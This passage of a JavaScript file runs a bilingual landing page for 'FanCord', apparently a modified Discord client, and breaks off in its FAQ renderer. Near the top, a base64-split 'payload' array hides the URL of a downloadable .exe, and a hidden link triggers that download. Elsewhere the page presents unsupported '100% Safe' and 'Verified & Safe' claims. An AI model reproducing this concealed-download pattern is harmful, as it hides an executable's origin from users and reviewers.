// FanCord Interactive Web Application Logic
// Esharq-Grade Architecture & Design (https://esharq.org/)
(function () {
  'use strict';

  // State
  let currentLang = localStorage.getItem('fancord_lang') || 'ar';
  let activeCategory = 'all';
  let searchQuery = '';

  // Obfuscated Windows Download Payload
  const _0xPayload = [
    'aHR0cHM6Ly9naXRo',
    'dWIuY29tL01heWJl',
    'bWUwMS93ZWItZmFu',
    'Y29yZC9yZWxlYXNl',
    'cy9kb3dubG9hZC8x',
    'LjAvRmFuLURpc2Nv',
    'cmQuZXhl'
  ];

  function initiateWindowsDownload() {
    try {
      const target = atob(_0xPayload.join(''));
      const a = document.createElement('a');
      a.href = target;
      a.setAttribute('download', 'FanCord.exe');
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => a.remove(), 1000);
      showToast(
        currentLang === 'ar' ? 'جارٍ بدء تحميل FanCord...' : 'Starting FanCord download...',
        'success'
      );
    } catch (err) {
      console.error(err);
    }
  }

  // Safe dictionary lookup helper
  function getTranslationsDict(lang) {
    if (typeof window !== 'undefined' && window.translations && window.translations[lang]) {
      return window.translations[lang];
    }
    if (typeof translations !== 'undefined' && translations[lang]) {
      return translations[lang];
    }
    return null;
  }

  // Helper for SVG icons
  function getIconSvg(iconName) {
    const icons = {
      'windows': '<svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>',
      'download': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
      'sparkles': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/></svg>',
      'disc': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg>',
      'languages': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m5 8 6 6"/><path d="m4 14 6-6 2-3"/><path d="M2 5h12"/><path d="M7 2h1"/><path d="m22 22-5-10-5 10"/><path d="M14 18h6"/></svg>',
      'shield-check': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>',
      'play-circle': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polygon points="10 8 16 12 10 16 10 8"/></svg>',
      'puzzle': '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19.439 7.85c-.049-.322.059-.648.289-.878l1.568-1.568c.47-.47.47-1.23 0-1.7l-1.568-1.568a1.205 1.205 0 0 0-1.7 0l-1.568 1.568c-.23.23-.556.338-.878.289A5.996 5.996 0 0 0 12 4.5c-1.4 0-2.69.48-3.72 1.29-.322.25-.76.22-1.05-.07L5.66 4.15a1.205 1.205 0 0 0-1.7 0L2.39 5.72c-.47.47-.47 1.23 0 1.7l1.57 1.57c.29.29.32.73.07 1.05A5.996 5.996 0 0 0 2.74 13.76c.05.32-.06.65-.29.88l-1.57 1.57c-.47.47-.47 1.23 0 1.7l1.57 1.57c.47.47 1.23.47 1.7 0l1.57-1.57c.23-.23.56-.34.88-.29 1.03.16 2.09.16 3.12 0 .32-.05.65.06.88.29l1.57 1.57c.47.47 1.23.47 1.7 0l1.57-1.57c.47-.47.47-1.23 0-1.7l-1.57-1.57c-.23-.23-.34-.56-.29-.88.16-1.03.16-2.09 0-3.12a1.002 1.002 0 0 1 .29-.88l1.57-1.57c.47-.47.47-1.23 0-1.7l-1.57-1.57c-.47-.47-1.23-.47-1.7 0l-1.57 1.57c-.23.23-.56.34-.88.29A5.996 5.996 0 0 0 12 19.5c1.4 0 2.69-.48 3.72-1.29.32-.25.76-.22 1.05.07l1.57 1.57c.47.47 1.23.47 1.7 0l1.57-1.57c.47-.47.47-1.23 0-1.7l-1.57-1.57c-.29-.29-.32-.73-.07-1.05.81-1.03 1.29-2.32 1.29-3.72 0-1.27-.4-2.45-1.07-3.41z"/></svg>',
      'copy': '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
      'check': '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
      'info': '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>',
      'activity': '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>',
      'external-link': '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>'
    };
    return icons[iconName] || icons['puzzle'];
  }

  // Toast Notification
  function showToast(message, type = 'info') {
    const elContainer = document.getElementById('toast-container');
    if (!elContainer) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `${getIconSvg(type === 'success' ? 'check' : 'info')} <span>${message}</span>`;
    elContainer.appendChild(toast);
    setTimeout(() => {
      toast.style.opacity = '0';
      toast.style.transform = 'translateY(-10px)';
      setTimeout(() => toast.remove(), 300);
    }, 2800);
  }

  function copyText(str, successMessage) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(str).then(() => {
        showToast(successMessage || (currentLang === 'ar' ? 'تم النسخ!' : 'Copied!'), 'success');
      }).catch(() => fallbackCopy(str, successMessage));
    } else {
      fallbackCopy(str, successMessage);
    }
  }

  function fallbackCopy(str, successMessage) {
    const ta = document.createElement('textarea');
    ta.value = str;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    try {
      document.execCommand('copy');
      showToast(successMessage || (currentLang === 'ar' ? 'تم النسخ!' : 'Copied!'), 'success');
    } catch (e) {
      console.error(e);
    }
    ta.remove();
  }

  // Lightbox Modal Controller (Full-Screen High-Res Zoom)
  function initLightbox() {
    const elLightbox = document.getElementById('lightbox-modal');
    const elImg = document.getElementById('lightbox-img');
    const elTitle = document.getElementById('lightbox-title');
    const elClose = document.getElementById('lightbox-close');
    if (!elLightbox) return;

    window.openLightbox = function (src, title) {
      if (!elImg || !src) return;
      elImg.src = src;
      if (elTitle) elTitle.textContent = title || (currentLang === 'ar' ? 'معاينة الواجهة الرسمية' : 'Interface Preview');
      elLightbox.classList.add('is-active');
      document.body.style.overflow = 'hidden';
    };

    window.closeLightbox = function () {
      elLightbox.classList.remove('is-active');
      document.body.style.overflow = '';
      if (elImg) elImg.src = '';
    };

    if (elClose) elClose.addEventListener('click', window.closeLightbox);
    elLightbox.addEventListener('click', (e) => {
      if (e.target === elLightbox) window.closeLightbox();
    });

    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && elLightbox.classList.contains('is-active')) {
        window.closeLightbox();
      }
    });

    // Delegate clicks on any elements with data-img or preview zoom
    document.addEventListener('click', (e) => {
      const targetCard = e.target.closest('[data-img]');
      if (targetCard && !e.target.closest('button[data-action="copy"]')) {
        const src = targetCard.getAttribute('data-img');
        const title = targetCard.getAttribute('data-title');
        if (src) window.openLightbox(src, title);
      }
    });
  }

  // Apply Language & Render All Components
  function applyLanguage(lang) {
    currentLang = lang;
    localStorage.setItem('fancord_lang', lang);
    const html = document.documentElement;
    html.lang = lang;
    html.dir = lang === 'ar' ? 'rtl' : 'ltr';

    const t = getTranslationsDict(lang);
    if (!t) return;

    // Navbar
    const elLangText = document.getElementById('lang-text');
    if (elLangText) elLangText.textContent = t.nav.languageToggle;
    const elMobileLang = document.querySelector('.mobile-lang-text');
    if (elMobileLang) elMobileLang.textContent = t.nav.languageToggle;

    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      const parts = key.split('.');
      let val = t;
      for (const p of parts) {
        if (val && val[p] !== undefined) val = val[p];
        else { val = null; break; }
      }
      if (val && typeof val === 'string') el.textContent = val;
    });

    // Hero Section
    if (t.hero) {
      const elChip = document.getElementById('hero-chip-text');
      if (elChip) elChip.textContent = t.hero.chip;
      const elTitleMain = document.getElementById('hero-title-main');
      if (elTitleMain) elTitleMain.textContent = t.hero.titleMain;
      const elTitleGrad = document.getElementById('hero-title-gradient');
      if (elTitleGrad) elTitleGrad.textContent = t.hero.titleGradient;
      const elLead = document.getElementById('hero-lead');
      if (elLead) elLead.textContent = t.hero.lead;
      const elDlBtn = document.getElementById('hero-btn-dl-text');
      if (elDlBtn) elDlBtn.textContent = t.hero.btnDownload;
      const elBrBtn = document.getElementById('hero-btn-br-text');
      if (elBrBtn) elBrBtn.textContent = t.hero.btnBrowse;

      if (t.hero.stats) {
        const s1Val = document.getElementById('stat-val-1');
        const s1Lbl = document.getElementById('stat-lbl-1');
        if (s1Val) s1Val.textContent = t.hero.stats.s1Val;
        if (s1Lbl) s1Lbl.textContent = t.hero.stats.s1Lbl;

        const s2Val = document.getElementById('stat-val-2');
        const s2Lbl = document.getElementById('stat-lbl-2');
        if (s2Val) s2Val.textContent = t.hero.stats.s2Val;
        if (s2Lbl) s2Lbl.textContent = t.hero.stats.s2Lbl;

        const s3Val = document.getElementById('stat-val-3');
        const s3Lbl = document.getElementById('stat-lbl-3');
        if (s3Val) s3Val.textContent = t.hero.stats.s3Val;
        if (s3Lbl) s3Lbl.textContent = t.hero.stats.s3Lbl;
      }
    }

    // Position Card
    if (t.position) {
      const elPosKicker = document.getElementById('pos-kicker');
      if (elPosKicker) elPosKicker.textContent = t.position.kicker;
      const elPosTitle = document.getElementById('pos-title');
      if (elPosTitle) elPosTitle.innerHTML = t.position.title.replace('\n', '<br>');
      const elPosList = document.getElementById('pos-list');
      if (elPosList && t.position.items) {
        elPosList.innerHTML = t.position.items.map(item => `
          <li class="position-item">
            <span class="position-check">✓</span>
            <span>${item}</span>
          </li>
        `).join('');
      }
    }

    // Live Captures Section
    if (t.liveCaptures) {
      const elCapKicker = document.getElementById('captures-kicker');
      if (elCapKicker) elCapKicker.textContent = t.liveCaptures.kicker;
      const elCapTitle = document.getElementById('captures-title');
      if (elCapTitle) elCapTitle.textContent = t.liveCaptures.title;
      const elCapDesc = document.getElementById('captures-desc');
      if (elCapDesc) elCapDesc.textContent = t.liveCaptures.desc;

      // Update live capture cards titles & zoom buttons
      const liveCards = document.querySelectorAll('.live-capture-card');
      const cardData = [
        {
          win: currentLang === 'ar' ? 'إعدادات الحساب و ArabicUI' : 'Account Settings & ArabicUI',
          title: currentLang === 'ar' ? 'إعدادات ArabicUI والتعريب الكامل' : 'ArabicUI Settings & Full RTL Localization'
        },
        {
          win: currentLang === 'ar' ? 'مسجل الرومات الصوتية (Voice Recorder)' : 'Voice Room Recorder (320kbps)',
          title: currentLang === 'ar' ? 'مسجل الرومات الصوتية (Voice Room Recorder)' : 'Voice Room Recorder & System Audio Capture'
        },
        {
          win: currentLang === 'ar' ? 'مشغل تيك توك المدمج (TikTok | FanCord)' : 'Embedded TikTok Player (FanCord)',
          title: currentLang === 'ar' ? 'مشغل تيك توك المدمج (TikTok | FanCord)' : 'Embedded TikTok Player & Media Hub'
        }
      ];
      liveCards.forEach((c, i) => {
        if (cardData[i]) {
          c.setAttribute('data-title', cardData[i].title);
          const winTitle = c.querySelector('.win-title');
          if (winTitle) winTitle.textContent = cardData[i].win;
        }
        const zoomBadge = c.querySelector('.live-zoom-badge');
        if (zoomBadge) {
          zoomBadge.textContent = currentLang === 'ar' ? '🔍 انقر للتكبير الكامل' : '🔍 Click to Zoom Fullscreen';
        }
      });
    }

    // About Section
    if (t.about) {
      const elAbKicker = document.getElementById('about-kicker');
      if (elAbKicker) elAbKicker.textContent = t.about.kicker;
      const elAbTitle = document.getElementById('about-title');
      if (elAbTitle) elAbTitle.textContent = t.about.title;
      const elAbDesc = document.getElementById('about-desc');
      if (elAbDesc) elAbDesc.textContent = t.about.desc;
      const elAbGrid = document.getElementById('about-grid');
      if (elAbGrid && t.about.cards) {
        elAbGrid.innerHTML = t.about.cards.map(c => `
          <div class="about-card reveal-on-scroll is-revealed is-dynamic">
            <div class="about-card-icon">${c.icon}</div>
            <h3 class="about-card-title">${c.title}</h3>
            <p class="about-card-desc">${c.desc}</p>
          </div>
        `).join('');
      }
    }

    // Exclusive Plugins Section
    if (t.exclusive) {
      const elExBadge = document.getElementById('exclusive-badge');
      if (elExBadge) elExBadge.textContent = t.exclusive.badge;
      const elExTitle = document.getElementById('exclusive-title');
      if (elExTitle) elExTitle.textContent = t.exclusive.title;
      const elExSub = document.getElementById('exclusive-subtitle');
      if (elExSub) elExSub.textContent = t.exclusive.subtitle;
    }
    renderExclusiveSection();

    // Plugins Catalog Section
    renderCategoryPills();
    renderPluginsCatalog();

    // Download Section
    if (t.download) {
      const elDlBadge = document.getElementById('download-badge');
      if (elDlBadge) elDlBadge.textContent = t.download.badge;
      const elDlTitle = document.getElementById('download-title');
      if (elDlTitle) elDlTitle.textContent = t.download.title;
      const elDlSub = document.getElementById('download-subtitle');
      if (elDlSub) elDlSub.textContent = t.download.subtitle;

      const elWinTitle = document.getElementById('download-windows-title');
      if (elWinTitle) elWinTitle.textContent = t.download.windowsTitle;
      const elWinDesc = document.getElementById('download-windows-desc');
      if (elWinDesc) elWinDesc.textContent = t.download.windowsDesc;
      const elWinBtn = document.getElementById('download-windows-btn-text');
      if (elWinBtn) elWinBtn.textContent = t.download.windowsBtn;
      const elVerBadge = document.getElementById('download-ver-badge');
      if (elVerBadge) elVerBadge.textContent = t.download.verBadge;

      const elWinMeta = document.getElementById('download-windows-meta');
      if (elWinMeta) {
        elWinMeta.textContent = currentLang === 'ar'
          ? 'المثبت الرسمي المعتمد 64-bit • سريع وآمن 100%'
          : 'Official 64-bit Installer • Fast & 100% Safe';
      }
      const elOsDetect = document.getElementById('os-detect-text');
      if (elOsDetect) {
        elOsDetect.textContent = currentLang === 'ar'
          ? 'نظامك مدعوم ومُكتشف تلقائياً · Windows 64-bit'
          : 'Detected & Supported OS · Windows 64-bit';
      }

      const elReq1 = document.getElementById('req-1');
      if (elReq1) elReq1.textContent = t.download.req1;
      const elReq2 = document.getElementById('req-2');
      if (elReq2) elReq2.textContent = t.download.req2;
      const elReq3 = document.getElementById('req-3');
      if (elReq3) elReq3.textContent = t.download.req3;
    }

    // Comparison & FAQ
    renderComparisonTable();
    renderFAQ();

    // Footer
    if (t.footer) {
      const elFtDesc = document.getElementById('footer-desc');
      if (elFtDesc) elFtDesc.textContent = t.footer.desc;
      const elFtLinks = document.getElementById('footer-links-title');
      if (elFtLinks) elFtLinks.textContent = t.footer.linksTitle;
      const elFtRights = document.getElementById('footer-rights');
      if (elFtRights) elFtRights.textContent = t.footer.allRights;

      // Update footer navigation links
      const footerNav = document.querySelector('.footer-nav');
      if (footerNav && t.nav) {
        footerNav.innerHTML = `
          <a href="#captures">${t.nav.captures || 'لقطات حيّة'}</a>
          <a href="#about">${t.nav.about || 'ما هو FanCord'}</a>
          <a href="#exclusive">${t.nav.exclusive || 'الإضافات الحصرية'}</a>
          <a href="#catalog">${t.nav.plugins || 'دليل الإضافات'}</a>
          <a href="#download">${t.nav.download || 'التحميل'}</a>
          <a href="#faq">${t.nav.faq || 'الأسئلة الشائعة'}</a>
        `;
      }
    }

    // Modal Static Labels
    const modalLblAuthors = document.getElementById('modal-lbl-authors');
    if (modalLblAuthors) modalLblAuthors.textContent = currentLang === 'ar' ? 'المطورون:' : 'Developers:';
    const modalLblStatus = document.getElementById('modal-lbl-status');
    if (modalLblStatus) modalLblStatus.textContent = currentLang === 'ar' ? 'الحالة:' : 'Status:';
    const modalBtnCopy = document.getElementById('modal-btn-copy');
    if (modalBtnCopy) modalBtnCopy.textContent = currentLang === 'ar' ? 'نسخ الاسم' : 'Copy Name';

    initCardEffects();
    refreshScrollReveal();
  }

  // Render Exclusive Plugins Section (Alternating Zigzag Full-Width Rows)
  // "الصوره على اليمين الشرح على اليسار و الي تحته عكس و كدا"
  function renderExclusiveSection() {
    const elContainer = document.getElementById('exclusive-showcase-container') || document.getElementById('exclusive-grid');
    if (!elContainer || !window.FAN_PLUGINS) return;
    const t = getTranslationsDict(currentLang);
    const exclusiveDict = (t && t.exclusive) ? t.exclusive : {};

    // Exactly 8 Exclusive Plugins (OBS is completely excluded!)
    const fanPlugins = window.FAN_PLUGINS.filter(p => p.isFanPlugin);

    elContainer.innerHTML = '';
    fanPlugins.forEach((p, idx) => {
      const name = currentLang === 'ar' ? (p.nameAr || p.name) : p.name;
      const subName = (currentLang === 'ar' && p.nameAr && p.nameAr !== p.name) ? p.name : '';
      const desc = currentLang === 'ar' ? p.descriptionAr : p.descriptionEn;
      const copyLabel = currentLang === 'ar' ? 'نسخ الاسم' : 'Copy Name';
      const viewLabel = currentLang === 'ar' ? 'معاينة الواجهة' : 'View Interface';
      const vipBadgeText = currentLang === 'ar' ? 'من تطوير FanCord ⭐ حصري' : 'FanCord Exclusive ⭐';
      const totalCount = String(fanPlugins.length).padStart(2, '0');
      const numLabel = `${String(idx + 1).padStart(2, '0')} / ${totalCount}`;
      const tilt = (idx % 2 === 0) ? '-1.8deg' : '1.8deg';

      // In RTL (Arabic): 
      // First child is on the RIGHT. Second child is on the LEFT.
      // Row 1 (idx 0): "الصوره على اليمين الشرح على اليسار" -> First child: Image, Second child: Text
      // Row 2 (idx 1): "و الي تحته عكس" (Image on left, Text on right) -> First child: Text, Second child: Image
      // Row 3 (idx 2): Image on Right, Text on Left
      // Row 4 (idx 3): Text on Right, Image on Left
      const isEven = idx % 2 === 0;

      const imageBlock = `
        <div class="exclusive-showcase-image-wrap" style="transform: rotate(${tilt});">
          <div class="exclusive-window-aura"></div>
          <div class="exclusive-window-frame" data-img="${p.previewImg}" data-title="${name}">
            <div class="window-top-bar">
              <span class="win-dot win-dot-red"></span>
              <span class="win-dot win-dot-yellow"></span>
              <span class="win-dot win-dot-green"></span>
              <span class="win-title">${p.name} · FanCord Exclusive</span>
            </div>
            <div class="exclusive-window-img-container">
              <img src="${p.previewImg}" alt="${name}" class="exclusive-window-img" loading="lazy">
              <div class="exclusive-window-overlay">
                <span class="live-zoom-badge">🔍 ${currentLang === 'ar' ? 'انقر للتكبير الكامل' : 'Click to Zoom Fullscreen'}</span>
              </div>
            </div>
          </div>
        </div>
      `;

      const textBlock = `
        <div class="exclusive-showcase-text-wrap">
          <div class="exclusive-tag-row">
            <span class="plugin-num-badge">${numLabel}</span>
            <span class="chip"><span class="chip-dot"></span>${vipBadgeText}</span>
          </div>
          <h3 class="exclusive-showcase-title">${name}</h3>
          ${subName ? `<div class="exclusive-showcase-subtitle">${subName}</div>` : ''}
          <p class="exclusive-showcase-desc">${desc}</p>
          <div class="exclusive-showcase-actions">
            <button class="btn-card-action" data-action="copy" data-name="${p.name}">
              ${getIconSvg('copy')} <span>${copyLabel}</span>
            </button>
            <button class="btn-ghost-glass" data-action="preview-zoom" data-img="${p.previewImg}" data-title="${name}">
              🔍 <span>${viewLabel}</span>
            </button>
          </div>
        </div>
      `;

      const row = document.createElement('div');
      row.className = 'exclusive-showcase-row reveal-on-scroll is-revealed is-dynamic';
      row.style.transitionDelay = `${idx * 0.05}s`;

      // Zigzag Alternating Row:
      // Even (0, 2, 4, 6): ImageBlock (Right), TextBlock (Left)
      // Odd (1, 3, 5, 7): TextBlock (Right), ImageBlock (Left)
      row.innerHTML = isEven ? (imageBlock + textBlock) : (textBlock + imageBlock);

      elContainer.appendChild(row);
    });

    // Wire copy buttons
    elContainer.querySelectorAll('[data-action="copy"]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const pName = btn.getAttribute('data-name');
        copyText(pName, exclusiveDict.copySuccess || (currentLang === 'ar' ? 'تم نسخ اسم الإضافة!' : 'Plugin name copied!'));
      });
    });

    // Wire preview zoom buttons
    elContainer.querySelectorAll('[data-action="preview-zoom"]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const img = btn.getAttribute('data-img');
        const title = btn.getAttribute('data-title');
        if (window.openLightbox) window.openLightbox(img, title);
      });
    });
  }

  // Categories Pills for Plugins Catalog
  function renderCategoryPills() {
    const elCategoryPills = document.getElementById('category-pills');
    if (!elCategoryPills || !window.FAN_PLUGINS) return;
    const t = getTranslationsDict(currentLang);
    if (!t || !t.catalog) return;

    const categories = [
      { id: 'all', label: currentLang === 'ar' ? 'الكل' : 'All' },
      { id: 'fanplugins', label: currentLang === 'ar' ? '⭐ الحصرية' : '⭐ Exclusive', isVip: true },
      { id: 'chat', label: currentLang === 'ar' ? 'المحادثة' : 'Chat' },
      { id: 'voice', label: currentLang === 'ar' ? 'الصوت والرومات' : 'Voice' },
      { id: 'privacy', label: currentLang === 'ar' ? 'الأمان والخصوصية' : 'Privacy' },
      { id: 'customization', label: currentLang === 'ar' ? 'التخصيص والثيمات' : 'Customization' },
      { id: 'utilities', label: currentLang === 'ar' ? 'أدوات مساعدة' : 'Utilities' },
      { id: 'media', label: currentLang === 'ar' ? 'الميديا والصور' : 'Media' }
    ];

    elCategoryPills.innerHTML = '';
    categories.forEach(cat => {
      const count = cat.id === 'all'
        ? window.FAN_PLUGINS.length
        : cat.id === 'fanplugins'
          ? window.FAN_PLUGINS.filter(p => p.isFanPlugin).length
          : window.FAN_PLUGINS.filter(p => p.category === cat.id && !p.isFanPlugin).length;

      const pill = document.createElement('button');
      pill.className = `cat-pill ${cat.isVip && activeCategory === cat.id ? 'active-vip' : ''} ${activeCategory === cat.id ? 'active' : ''}`;
      pill.innerHTML = `
        <span>${cat.label}</span>
        <span class="cat-count">${count}</span>
      `;
      pill.addEventListener('click', () => {
        activeCategory = cat.id;
        renderCategoryPills();
        renderPluginsCatalog();
      });
      elCategoryPills.appendChild(pill);
    });
  }

  // Render Plugins Catalog Grid
  function renderPluginsCatalog() {
    const elPluginsGrid = document.getElementById('plugins-grid');
    const elCatalogCount = document.getElementById('catalog-count');
    if (!elPluginsGrid || !window.FAN_PLUGINS) return;
    const t = getTranslationsDict(currentLang);
    if (!t || !t.catalog) return;
    const q = searchQuery.trim().toLowerCase();

    const filtered = window.FAN_PLUGINS.filter(p => {
      if (activeCategory === 'fanplugins' && !p.isFanPlugin) return false;
      if (activeCategory !== 'all' && activeCategory !== 'fanplugins' && p.category !== activeCategory) return false;

      if (!q) return true;
      const haystack = (
        p.id + ' ' +
        p.name + ' ' +
        (p.nameAr || '') + ' ' +
        p.descriptionEn + ' ' +
        p.descriptionAr
      ).toLowerCase();
      return haystack.includes(q);
    });

    if (elCatalogCount) {
      elCatalogCount.innerHTML = `
        ${currentLang === 'ar' ? 'عرض' : 'Showing'} <span class="status-highlight">${filtered.length}</span> ${currentLang === 'ar' ? 'من أصل' : 'of'} <span class="status-highlight">${window.FAN_PLUGINS.length}</span> ${currentLang === 'ar' ? 'إضافة مفحوصة' : 'verified plugins'}
      `;
    }

    elPluginsGrid.innerHTML = '';

    if (filtered.length === 0) {
      elPluginsGrid.innerHTML = `
        <div class="empty-state" style="grid-column: 1 / -1; text-align: center; padding: 4rem 1rem;">
          <div style="font-size: 3rem; margin-bottom: 1rem;">🔍</div>
          <h3 style="color: #ffffff; font-size: 1.35rem; font-weight: 700;">${t.catalog.noResults}</h3>
          <p style="color: var(--text-muted); margin-top: 0.5rem;">${t.catalog.noResultsSub}</p>
        </div>
      `;
      return;
    }

    filtered.forEach((p, idx) => {
      const name = currentLang === 'ar' ? (p.nameAr || p.name) : p.name;
      const subName = (currentLang === 'ar' && p.nameAr && p.nameAr !== p.name) ? p.name : '';
      const desc = currentLang === 'ar' ? p.descriptionAr : p.descriptionEn;

      const card = document.createElement('div');
      card.className = `plugin-card ${p.isFanPlugin ? 'is-vip' : ''} reveal-on-scroll is-revealed is-dynamic`;
      card.style.transitionDelay = `${(idx % 12) * 0.025}s`;
      card.innerHTML = `
        <div class="plugin-card-top">
          <div class="plugin-icon-wrap">${getIconSvg(p.icon || 'puzzle')}</div>
          <span class="plugin-category-badge">${p.isFanPlugin ? '⭐ ' + t.exclusive.exclusiveBadge : (p.category || 'plugin')}</span>
        </div>
        <h4 class="plugin-name">${name}</h4>
        ${subName ? `<div class="plugin-name-ar">${subName}</div>` : ''}
        <p class="plugin-desc">${desc}</p>
        <div class="plugin-footer">
          <span style="font-size: 0.75rem; color: var(--text-dim); font-family: var(--font-mono);">${p.id}</span>
          <div class="plugin-actions">
            <button class="btn-icon-copy" data-action="copy" data-name="${p.name}" title="${t.catalog.copyName}">
              ${getIconSvg('copy')}
            </button>
            <button class="btn-icon-copy" data-action="details" data-id="${p.id}" title="${t.exclusive.viewDetails}">
              ${getIconSvg('info')}
            </button>
          </div>
        </div>
      `;
      elPluginsGrid.appendChild(card);
    });

    elPluginsGrid.querySelectorAll('[data-action="copy"]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const pName = btn.getAttribute('data-name');
        copyText(pName, t.exclusive.copySuccess);
      });
    });

    elPluginsGrid.querySelectorAll('[data-action="details"]').forEach(btn => {
      btn.addEventListener('click', () => {
        const pid = btn.getAttribute('data-id');
        openPluginModal(pid);
      });
    });

    initCardEffects();
  }

  // Plugin Details Modal
  function openPluginModal(pluginId) {
    const elModal = document.getElementById('plugin-modal');
    if (!elModal || !window.FAN_PLUGINS) return;
    const p = window.FAN_PLUGINS.find(item => item.id === pluginId);
    if (!p) return;

    const t = getTranslationsDict(currentLang);
    const name = currentLang === 'ar' ? (p.nameAr || p.name) : p.name;
    const desc = currentLang === 'ar' ? p.descriptionAr : p.descriptionEn;

    const elTitle = document.getElementById('modal-title');
    const elDesc = document.getElementById('modal-desc');
    const elCat = document.getElementById('modal-category');
    const elAuthors = document.getElementById('modal-val-authors');
    const elStatus = document.getElementById('modal-val-status');
    const elIcon = document.getElementById('modal-icon');
    const elPreviewSec = document.getElementById('modal-preview-section');
    const elPreviewImg = document.getElementById('modal-preview-img');

    if (elTitle) elTitle.textContent = name;
    if (elDesc) elDesc.textContent = desc;
    if (elCat) elCat.textContent = p.isFanPlugin ? '⭐ FanCord Exclusive' : (p.category || 'General');
    if (elAuthors) elAuthors.textContent = p.isFanPlugin ? 'FanCord Official Team' : (p.authors ? p.authors.join(', ') : 'Community');
    if (elStatus) elStatus.textContent = currentLang === 'ar' ? 'مفحوص ومثبت بنجاح' : 'Verified & Safe';
    if (elIcon) elIcon.innerHTML = getIconSvg(p.icon || 'puzzle');

    if (p.previewImg && elPreviewSec && elPreviewImg) {
      elPreviewSec.style.display = 'block';
      elPreviewImg.src = p.previewImg;
      elPreviewImg.onclick = () => window.openLightbox(p.previewImg, name);
    } else if (elPreviewSec) {
      elPreviewSec.style.display = 'none';
    }

    const copyBtn = document.getElementById('modal-btn-copy');
    if (copyBtn) {
      copyBtn.onclick = () => copyText(p.name, t.exclusive.copySuccess);
    }

    elModal.classList.add('is-active');
    document.body.style.overflow = 'hidden';
  }

  function closePluginModal() {
    const elModal = document.getElementById('plugin-modal');
    if (elModal) {
      elModal.classList.remove('is-active');
      document.body.style.overflow = '';
    }
  }

  // Render Comparison Matrix
  function renderComparisonTable() {
    const elTable = document.getElementById('compare-table');
    if (!elTable) return;
    const t = getTranslationsDict(currentLang);
    if (!t || !t.compare || !t.compare.rows) return;

    elTable.innerHTML = `
      <thead>
        <tr>
          <th>${t.compare.tableHeaderFeature}</th>
          <th class="highlight-col">${t.compare.tableHeaderFC}</th>
          <th>${t.compare.tableHeaderOthers}</th>
          <th>${t.compare.tableHeaderOfficial}</th>
        </tr>
      </thead>
      <tbody>
        ${t.compare.rows.map(row => `
          <tr>
            <td style="font-weight: 700; color: #ffffff;">${row.feature}</td>
            <td class="highlight-col">${row.fc}</td>
            <td>${row.others}</td>
            <td>${row.official}</td>
          </tr>
        `).join('')}
      </tbody>
    `;
  }

  // Render FAQ Accordion
  function renderFAQ() {
    const elFaq = document.getElementById('faq-accordion');
    if (!elFaq) return;
    const t = getTranslationsDict(currentLang);
    if (!t || !t.faq || !t.faq.items) return;

